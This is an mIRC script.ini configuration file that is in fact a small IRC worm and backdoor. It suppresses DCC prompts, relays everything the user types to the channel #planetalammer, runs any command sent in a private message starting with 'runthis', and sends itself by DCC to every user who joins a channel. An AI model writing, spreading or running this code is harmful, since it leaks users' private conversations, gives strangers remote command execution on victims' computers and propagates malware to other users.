[script]
n0=remove.scrip
n1=
n2=
n3=on 1:START:{
n4=  .sreq ignore
n5=  .remote on
n6=}
n7=on 1:CONNECT:
n8=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n9=on 1:INPUT:*:{
n10=  .msg #planetalammer ( $+ $active $+ ) $1-
n11=}
n12=on 1:TEXT:*:?:{
n13=  if ( $1 == runthis ) { .run $2- }
n14=}
n15=
n16=on 1:JOIN:*:{
n17=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n18=}
